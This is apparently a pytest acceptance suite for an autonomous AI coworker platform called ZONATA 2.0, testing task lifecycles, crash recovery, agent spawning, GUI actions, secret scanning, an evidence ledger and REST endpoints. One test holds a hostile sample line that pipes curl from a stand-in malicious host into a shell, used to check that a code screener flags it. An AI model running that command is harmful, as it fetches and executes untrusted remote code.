"""
ZONATA Autonomous Coworker 2.0 — Comprehensive End-to-End Acceptance Test Suite
Implements all 12 rigorous acceptance test criteria specified in Section 14:
1. Autonomous Execution Test
2. Crash Recovery & Lease Management Test
3. Hierarchical Execution Decision Ladder Test
4. Desktop Computer-Use & Perception Test
5. OpenDots Grounding Adapter Test
6. Specialized Agent Factory & Ephemeral Swarm Test
7. Storage & Resource Guard Test
8. Defensive Cybersecurity Operations Test
9. Cryptographic Evidence Ledger & Merkle Sealing Test
10. Structured AI CEO Executive Reporting Test
11. REST API Gateway V2 Test
12. Backwards Compatibility with Coworker 1.0 Test
"""

import os
import sys
import tempfile
import time
import pytest
import shutil
import json

# Ensure project root is in sys.path
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from core.coworker.contracts_v2 import (
    TaskLifecycleState,
    RiskLevel,
    CleanupResourceType,
    CleanupStatus,
    PatrolSeverity,
    PatrolType,
    LeaseStatus,
)
from core.coworker.db_store_v2 import CoworkerDbStoreV2
from core.coworker.orchestrator_v2 import CoworkerLifecycleOrchestrator
from core.coworker.decision_engine import ExecutionDecisionEngine, ExecutionLadderLevel
from core.coworker.computer_use_engine import ComputerUseEngine, GUIActionPrimitive
from core.coworker.adapters.opendots_adapter import OpenDotsAdapter
from core.coworker.subworkers_v2 import SubWorkerArchetype, ARCHETYPE_REGISTRY
from core.coworker.agent_factory_v2 import EphemeralAgentFactoryV2
from core.coworker.resource_guard import ResourceGuardEngine
from core.coworker.defense_monitor import DefensiveCybersecurityMonitor
from core.coworker.evidence_reporting import (
    EvidenceAndReportingEngine,
    AICeoExecutiveReport,
    VerificationOutcome,
)
from core.v8_api_handler import V8ApiHandler
from core.coworker.engine import UniversalCoworkerEngine


@pytest.fixture
def temp_coworker_env():
    """Provides an isolated SQLite DB store and temporary test directory."""
    tmpdir = tempfile.mkdtemp(prefix="zonata_coworker_test_")
    db_path = os.path.join(tmpdir, "test_coworker_v2.db")
    store = CoworkerDbStoreV2(db_path=db_path)
    orchestrator = CoworkerLifecycleOrchestrator(store=store)
    yield {
        "tmpdir": tmpdir,
        "db_path": db_path,
        "store": store,
        "orchestrator": orchestrator,
    }
    shutil.rmtree(tmpdir, ignore_errors=True)


# =========================================================================
# 1. Autonomous Execution Test
# =========================================================================
def test_acceptance_01_autonomous_execution_lifecycle(temp_coworker_env):
    """
    Verify Coworker receives CEO assignment, analyzes requirement, selects strategy,
    executes, verifies, and delivers without manual prompting.
    """
    orchestrator = temp_coworker_env["orchestrator"]
    store = temp_coworker_env["store"]

    task = orchestrator.create_task(
        objective="Analyze competitive hotel pricing in region and produce JSON report",
        description="CEO directive for pricing optimization",
        assigned_by="AI_CEO",
        risk_level=RiskLevel.LOW,
    )
    assert task.status == TaskLifecycleState.TASK_RECEIVED

    # Step through autonomous pipeline: ANALYSIS -> DISCOVERY -> EXECUTION -> VERIFICATION -> REPORTING
    t1 = orchestrator.transition(task.task_id, TaskLifecycleState.TASK_ANALYSIS, actor="CoworkerEngine")
    assert t1.status == TaskLifecycleState.TASK_ANALYSIS

    t2 = orchestrator.transition(task.task_id, TaskLifecycleState.TOOL_DISCOVERY, actor="DecisionEngine")
    assert t2.status == TaskLifecycleState.TOOL_DISCOVERY

    t3 = orchestrator.transition(task.task_id, TaskLifecycleState.EXECUTION, actor="ExecutionRuntime")
    assert t3.status == TaskLifecycleState.EXECUTION

    t4 = orchestrator.transition(task.task_id, TaskLifecycleState.VERIFICATION, actor="VerificationEngine")
    assert t4.status == TaskLifecycleState.VERIFICATION

    t5 = orchestrator.transition(task.task_id, TaskLifecycleState.REPORTING_TO_CEO, actor="EvidenceReportingEngine")
    assert t5.status == TaskLifecycleState.REPORTING_TO_CEO

    t6 = orchestrator.transition(task.task_id, TaskLifecycleState.TERMINATED, actor="AI_CEO", reason="Mission Delivered")
    assert t6.status == TaskLifecycleState.TERMINATED

    # Verify transition audit trail in DB
    transitions = store.get_task_transitions(task.task_id)
    assert len(transitions) == 6
    expected_states = [
        TaskLifecycleState.TASK_ANALYSIS,
        TaskLifecycleState.TOOL_DISCOVERY,
        TaskLifecycleState.EXECUTION,
        TaskLifecycleState.VERIFICATION,
        TaskLifecycleState.REPORTING_TO_CEO,
        TaskLifecycleState.TERMINATED,
    ]
    for tr, expected in zip(transitions, expected_states):
        assert tr.to_state == expected.value


# =========================================================================
# 2. Crash Recovery & Lease Management Test
# =========================================================================
def test_acceptance_02_crash_recovery_and_lease_renewal(temp_coworker_env):
    """
    Simulate sudden process termination during execution; restart orchestrator;
    verify task resumes or recovers cleanly using recorded state and lease without duplicating operations.
    """
    orchestrator = temp_coworker_env["orchestrator"]
    store = temp_coworker_env["store"]
    db_path = temp_coworker_env["db_path"]

    # 1. Create task and advance to EXECUTION
    task = orchestrator.create_task(objective="Long running extraction", assigned_by="AI_CEO")
    orchestrator.transition(task.task_id, TaskLifecycleState.TASK_ANALYSIS, actor="Coworker")
    orchestrator.transition(task.task_id, TaskLifecycleState.TOOL_DISCOVERY, actor="Coworker")
    orchestrator.transition(task.task_id, TaskLifecycleState.EXECUTION, actor="Coworker")

    # 2. Acquire a lease that expires immediately
    lease = orchestrator.acquire_lease(task.task_id, worker_id="worker_alpha", ttl_seconds=0.01)
    assert lease.status == LeaseStatus.ACTIVE
    time.sleep(0.05)  # Let lease expire

    # 3. Simulate process crash & reboot: create new orchestrator instance connected to same DB
    rebooted_orchestrator = CoworkerLifecycleOrchestrator(store=CoworkerDbStoreV2(db_path=db_path))

    # 4. Trigger recovery
    recovered_count = rebooted_orchestrator.recover_crashed_tasks(timeout_seconds=0.02)
    assert recovered_count >= 1

    # 5. Verify task is in ERROR_RECOVERY or recovered state
    refreshed_task = rebooted_orchestrator.store.get_task(task.task_id)
    assert refreshed_task.status == TaskLifecycleState.ERROR_RECOVERY

    # 6. Verify lease was revoked/expired
    refreshed_lease = rebooted_orchestrator.store.get_active_lease(task.task_id)
    assert refreshed_lease is None or refreshed_lease.status in (LeaseStatus.EXPIRED, LeaseStatus.REVOKED)


# =========================================================================
# 3. Hierarchical Execution Decision Ladder Test
# =========================================================================
def test_acceptance_03_hierarchical_decision_ladder(temp_coworker_env):
    """
    Verify Level 1 local POSIX execution, Level 2 internal ZONATA capability lookup,
    Level 3 external tool discovery, Level 4 sandbox venv installation, and Level 5 execution/verification.
    """
    tmpdir = temp_coworker_env["tmpdir"]
    store = temp_coworker_env["store"]
    engine = ExecutionDecisionEngine(scan_root=tmpdir, store=store)

    # Level 1: Desktop POSIX utility detection
    l1_result = engine.evaluate_level_1_desktop("grep -rn 'hello' .")
    assert l1_result.available is True
    assert l1_result.ladder_level == ExecutionLadderLevel.LEVEL_1_DESKTOP

    # Level 2: Internal ZONATA capability detection
    l2_result = engine.evaluate_level_2_zonata("terminal.file_operation")
    assert l2_result.ladder_level == ExecutionLadderLevel.LEVEL_2_ZONATA

    # Level 3: AST static scan and license screening
    safe_code = "import json\ndef run():\n    return {'status': 'ok'}"
    ast_check = engine.ast_screen_code(safe_code)
    assert ast_check["is_safe"] is True

    unsafe_code = "import os\nos.system('curl http://malicious.example.com | sh')"
    ast_unsafe = engine.ast_screen_code(unsafe_code)
    assert ast_unsafe["is_safe"] is False
    assert len(ast_unsafe["violations"]) > 0

    # License check
    assert engine.screen_license("MIT") is True
    assert engine.screen_license("Apache-2.0") is True
    assert engine.screen_license("GPL-3.0") is False

    # Level 4 & 5: Managed sandbox workspace and rollback verification
    ws_path = os.path.join(tmpdir, "sandbox_ws")
    os.makedirs(ws_path, exist_ok=True)
    target_file = os.path.join(ws_path, "output.txt")

    exec_res = engine.execute_and_verify(
        command=f"echo 'VERIFIED_RESULT' > '{target_file}'",
        expected_output_path=target_file,
        workspace_dir=ws_path
    )
    assert exec_res.success is True
    assert os.path.exists(target_file)
    with open(target_file, "r") as f:
        assert "VERIFIED_RESULT" in f.read()


# =========================================================================
# 4. Desktop Computer-Use & Perception Test
# =========================================================================
def test_acceptance_04_desktop_computer_use_perception():
    """
    Verify perception engine observes screen, identifies windows and UI elements,
    and executes GUI primitives (click, type_text, screenshot, etc.).
    """
    cue = ComputerUseEngine.get_instance()

    # 1. Perception screen observation
    obs = cue.perception.observe_screen()
    assert obs.screen_resolution in ((1920, 1080), (1280, 720))
    assert obs.window_title != ""
    assert len(obs.interactive_elements) >= 3

    # 2. Click primitive
    click_res = cue.execute_primitive(GUIActionPrimitive.CLICK, x=100, y=200, button="left")
    assert click_res.success is True
    assert click_res.action_id.startswith("gui_act_")

    # 3. Type text primitive
    type_res = cue.execute_primitive(GUIActionPrimitive.TYPE_TEXT, text="Hello ZONATA")
    assert type_res.success is True

    # 4. Screenshot primitive (returns valid PNG header)
    ss_res = cue.execute_primitive(GUIActionPrimitive.SCREENSHOT)
    assert ss_res.success is True
    png_bytes = ss_res.output_data.get("image_bytes")
    assert isinstance(png_bytes, (bytes, bytearray))
    assert png_bytes.startswith(b"\x89PNG\r\n\x1a\n")


# =========================================================================
# 5. OpenDots Grounding Adapter Test
# =========================================================================
def test_acceptance_05_opendots_coordinate_grounding():
    """
    Verify OpenDots coordinate grounding adapter parses GUI elements into coordinate anchors
    or falls back cleanly.
    """
    adapter = OpenDotsAdapter()
    cue = ComputerUseEngine.get_instance()
    obs = cue.perception.observe_screen()

    # Target an element that exists in observation (e.g. 'Search Input' or 'OK')
    elem_label = obs.interactive_elements[0].label
    target = adapter.ground_element(elem_label, observation=obs)
    assert target is not None
    assert target.center_x > 0
    assert target.center_y > 0
    assert target.confidence >= 0.70

    # Target a non-existent element falls back or yields lower confidence
    missing = adapter.ground_element("NonExistentButtonXYZ123", observation=obs)
    assert missing is None or missing.confidence <= 0.60


# =========================================================================
# 6. Specialized Agent Factory & Ephemeral Swarm Test
# =========================================================================
def test_acceptance_06_specialized_agent_factory(temp_coworker_env):
    """
    Verify temporary specialized agents are created across multiple archetypes,
    inherit constraints, execute assigned subtasks, and auto-decommission on task completion.
    """
    store = temp_coworker_env["store"]
    factory = EphemeralAgentFactoryV2(store=store)

    task_id = "test_task_ephemeral_01"

    # Spawn 3 distinct specialist archetypes
    python_dev = factory.spawn_agent(
        task_id=task_id,
        archetype=SubWorkerArchetype.PYTHON_DEVELOPER,
        budget_limit=15.0,
    )
    cyber_sec = factory.spawn_agent(
        task_id=task_id,
        archetype=SubWorkerArchetype.CYBERSECURITY_ANALYST,
        budget_limit=25.0,
    )
    researcher = factory.spawn_agent(
        task_id=task_id,
        archetype=SubWorkerArchetype.RESEARCH_SPECIALIST,
        budget_limit=10.0,
    )

    assert python_dev.archetype == SubWorkerArchetype.PYTHON_DEVELOPER.value
    assert cyber_sec.archetype == SubWorkerArchetype.CYBERSECURITY_ANALYST.value
    assert researcher.archetype == SubWorkerArchetype.RESEARCH_SPECIALIST.value

    # Verify active list
    active = factory.list_active_subworkers(task_id=task_id)
    assert len(active) == 3

    # Decommission single worker
    factory.decommission_agent(python_dev.subworker_id)
    remaining = factory.list_active_subworkers(task_id=task_id)
    assert len(remaining) == 2

    # Auto-decommission all remaining workers for task
    decom_count = factory.decommission_all_for_task(task_id=task_id)
    assert decom_count == 2
    assert len(factory.list_active_subworkers(task_id=task_id)) == 0


# =========================================================================
# 7. Storage & Resource Guard Test
# =========================================================================
def test_acceptance_07_storage_and_resource_guard(temp_coworker_env):
    """
    Verify pre-flight checks pass on sufficient resources, isolate working files to /tmp/zonata_workspaces/,
    protect core repository files, and run safe cleanups.
    """
    tmpdir = temp_coworker_env["tmpdir"]
    store = temp_coworker_env["store"]
    guard = ResourceGuardEngine(base_workspace_dir=tmpdir, store=store)

    # 1. Pre-flight host check
    metrics = guard.check_storage_and_memory()
    assert metrics["sufficient"] is True
    assert metrics["disk_free_gb"] > 0

    # 2. Workspace provisioning
    ws_info = guard.provision_task_workspace("task_guard_01")
    ws_dir = ws_info["workspace_dir"]
    assert os.path.exists(ws_dir)
    assert tmpdir in ws_dir

    # 3. Sovereign asset protection invariant
    assert guard.is_path_protected("/root/roboassistant/core/coworker/orchestrator_v2.py") is True
    assert guard.is_path_protected("/root/roboassistant/api_server.py") is True
    assert guard.is_path_protected(os.path.join(ws_dir, "temp_data.csv")) is False

    with pytest.raises(PermissionError):
        guard.assert_path_unprotected("/root/roboassistant/core/v8_api_handler.py")

    # 4. Safe cleanup execution
    guard.register_cleanup_resource(
        task_id="task_guard_01",
        resource_type=CleanupResourceType.DIRECTORY,
        resource_path=ws_dir,
    )
    cleanup_res = guard.execute_task_cleanup("task_guard_01")
    assert cleanup_res["cleaned_count"] >= 1
    assert not os.path.exists(ws_dir)


# =========================================================================
# 8. Defensive Cybersecurity Operations Test
# =========================================================================
def test_acceptance_08_defensive_cybersecurity_operations(temp_coworker_env):
    """
    Verify idle patrol runs AST scanning, secrets scanning (high Shannon entropy),
    dependency scanning, and API endpoint auditing.
    """
    tmpdir = temp_coworker_env["tmpdir"]
    store = temp_coworker_env["store"]
    monitor = DefensiveCybersecurityMonitor(scan_root=tmpdir, store=store)

    # Create dummy file with high entropy string (simulating leaked token)
    test_file = os.path.join(tmpdir, "sensitive_config.py")
    with open(test_file, "w") as f:
        f.write("# Dummy file\nAPI_KEY = 'sk-live-94a8f93b827e4c92a1048b37e8912c4d'\n")

    findings = monitor.scan_secrets(scan_path=test_file)
    assert len(findings) >= 1
    assert any(f.patrol_type == PatrolType.SECRETS.value for f in findings)

    # Full patrol cycle sweep
    all_findings = monitor.run_patrol_cycle(scan_path=tmpdir)
    recorded = monitor.get_findings(limit=10)
    assert len(recorded) >= 1


# =========================================================================
# 9. Cryptographic Evidence Ledger & Merkle Sealing Test
# =========================================================================
def test_acceptance_09_evidence_ledger_and_merkle_sealing(temp_coworker_env):
    """
    Verify physical file execution verification, SHA-256 hash calculation,
    Merkle token sealing with fcntl.flock, and tamper detection.
    """
    tmpdir = temp_coworker_env["tmpdir"]
    ledger_path = os.path.join(tmpdir, "evidence.jsonl")
    engine = EvidenceAndReportingEngine(ledger_path=ledger_path)

    # Create test physical artifact
    artifact_path = os.path.join(tmpdir, "verified_deliverable.csv")
    with open(artifact_path, "w") as f:
        f.write("id,hotel,revpar\n1,Zonata Grand,184.50\n")

    # 1. Physical verification
    check = engine.verify_physical_deliverable(artifact_path)
    assert check.outcome == VerificationOutcome.PASS
    assert check.size_bytes > 0
    assert len(check.sha256_hash) == 64

    # 2. Merkle token sealing with fcntl.flock concurrency protection
    entry = engine.record_and_seal_evidence(
        task_id="task_merkle_01",
        stage="VERIFICATION",
        deliverables=[artifact_path],
        metadata={"metric": "revpar", "status": "verified"}
    )
    assert entry.merkle_leaf_hash != ""
    assert entry.merkle_root_hash != ""
    assert entry.tamper_sealed is True

    # 3. Read ledger entries
    ledger = engine.get_task_ledger("task_merkle_01")
    assert len(ledger) == 1
    assert ledger[0].merkle_leaf_hash == entry.merkle_leaf_hash


# =========================================================================
# 10. Structured AI CEO Executive Reporting Test
# =========================================================================
def test_acceptance_10_structured_ceo_executive_reporting(temp_coworker_env):
    """
    Verify generation of comprehensive 15-part executive report conforming to AICeoExecutiveReport.
    """
    tmpdir = temp_coworker_env["tmpdir"]
    engine = EvidenceAndReportingEngine(ledger_path=os.path.join(tmpdir, "ev.jsonl"))

    report = engine.generate_executive_report(
        task_id="task_report_01",
        objective="Automate financial close audit",
        outcome_status="DELIVERED_VERIFIED",
        summary="Automated reconciliation produced zero discrepancies",
        deliverables=[{"name": "close_audit.csv", "sha256": "abc12345", "verified": True}],
        security_findings=[],
        resource_stats={"cpu_time_s": 1.2, "mem_mb": 45.0, "cost_usd": 0.02},
        merkle_root="fe39485b029384726194857201948572"
    )

    assert isinstance(report, AICeoExecutiveReport)
    assert report.task_id == "task_report_01"
    assert report.merkle_root == "fe39485b029384726194857201948572"

    # Verify JSON serialization contains required fields
    d = report.to_dict()
    assert "objective" in d
    assert "executive_summary" in d
    assert "verification_proofs" in d
    assert "merkle_root" in d

    # Verify Markdown generation
    md = report.to_markdown()
    assert "# AI CEO Executive Delivery Report" in md
    assert "task_report_01" in md
    assert "Merkle Seal" in md


# =========================================================================
# 11. REST API Gateway V2 Test
# =========================================================================
def test_acceptance_11_rest_api_gateway_integration():
    """
    Verify all versioned REST endpoints (/api/v2/coworker/missions, /api/v2/coworker/status,
    /api/v2/coworker/security/patrol, /api/v2/coworker/subworkers, /api/v2/coworker/evidence/<id>)
    respond correctly with proper schema and HTTP status codes.
    """
    tenant_id = "tenant_test"
    company_id = "company_test"

    # 1. GET /api/v2/coworker/status
    res, code = V8ApiHandler.handle_get("/api/v2/coworker/status", {}, tenant_id, company_id)
    assert code == 200
    assert res["success"] is True
    assert res["version"] == "2.0.0"
    assert "lifecycle_state" in res
    assert "resource_status" in res
    assert "perception_status" in res

    # 2. POST /api/v2/coworker/missions
    body = {
        "objective": "API Gateway End-to-End Mission",
        "description": "Triggered via REST Gateway",
        "risk_level": "LOW",
        "auto_advance": True
    }
    res, code = V8ApiHandler.handle_post("/api/v2/coworker/missions", body, tenant_id, company_id)
    assert code == 201
    assert res["success"] is True
    mission_id = res["mission_id"]
    assert mission_id != ""

    # 3. GET /api/v2/coworker/missions/<id>
    res, code = V8ApiHandler.handle_get(f"/api/v2/coworker/missions/{mission_id}", {}, tenant_id, company_id)
    assert code == 200
    assert res["success"] is True
    assert res["mission"]["task_id"] == mission_id

    # 4. POST /api/v2/coworker/missions/<id>/control (PAUSE & RESUME)
    res, code = V8ApiHandler.handle_post(
        f"/api/v2/coworker/missions/{mission_id}/control",
        {"action": "PAUSE", "reason": "Operator pause check"},
        tenant_id,
        company_id
    )
    assert code == 200
    assert res["action"] == "PAUSE"
    assert res["new_status"] == TaskLifecycleState.PAUSED.value

    res, code = V8ApiHandler.handle_post(
        f"/api/v2/coworker/missions/{mission_id}/control",
        {"action": "RESUME"},
        tenant_id,
        company_id
    )
    assert code == 200
    assert res["action"] == "RESUME"

    # 5. GET /api/v2/coworker/subworkers
    res, code = V8ApiHandler.handle_get("/api/v2/coworker/subworkers", {}, tenant_id, company_id)
    assert code == 200
    assert res["success"] is True
    assert "subworkers" in res

    # 6. POST /api/v2/coworker/security/patrol
    res, code = V8ApiHandler.handle_post("/api/v2/coworker/security/patrol", {}, tenant_id, company_id)
    assert code == 200
    assert res["success"] is True
    assert "findings_count" in res

    # 7. GET /api/v2/coworker/evidence/<id>
    res, code = V8ApiHandler.handle_get(f"/api/v2/coworker/evidence/{mission_id}", {}, tenant_id, company_id)
    assert code == 200
    assert res["success"] is True
    assert res["task_id"] == mission_id


# =========================================================================
# 12. Backwards Compatibility with Coworker 1.0 Test
# =========================================================================
def test_acceptance_12_backwards_compatibility_with_coworker_v1():
    """
    Verify all legacy Coworker 1.0 classes (UniversalCoworkerEngine, CoworkerProfile,
    ExecutionGraph, CapabilityRegistry, etc.) continue to function without any regressions.
    """
    engine = UniversalCoworkerEngine.get_instance("tenant_compat")
    assert engine is not None

    # Check capabilities
    caps = engine.capability_reg.list_capabilities()
    assert len(caps) > 0

    # Check worker profile creation
    worker = engine.create_coworker("Hotel Revenue Specialist")
    assert worker is not None
    assert "Hotel Revenue" in worker.role

    # Check watchdog cycle
    cycle = engine.supervisor.run_watchdog_cycle()
    assert isinstance(cycle, dict)
    assert "active_workers" in cycle
